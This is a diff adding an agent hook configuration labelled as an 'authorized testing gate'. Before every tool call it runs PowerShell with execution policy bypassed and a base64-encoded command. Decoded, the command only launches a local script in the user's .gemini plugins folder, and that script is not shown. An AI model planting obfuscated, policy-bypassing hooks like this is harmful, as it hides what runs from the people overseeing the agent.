@@ -1,0 +1,16 @@
+{
+  "workflowguard-authorized-testing-gate": {
+    "PreToolUse": [
+      {
+        "matcher": "*",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JgAgACgAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQAgACsAIAAnAC8ALgBnAGUAbQBpAG4AaQAvAGMAbwBuAGYAaQBnAC8AcABsAHUAZwBpAG4AcwAvAHcAbwByAGsAZgBsAG8AdwBnAHUAYQByAGQALQBxAGEALwBzAGMAcgBpAHAAdABzAC8AYQBnAHkALQBzAGEAZgBlAHQAeQAtAGgAbwBvAGsALgBwAHMAMQAnACkA",
+            "timeout": 10
+          }
+        ]
+      }
+    ]
+  }
+}
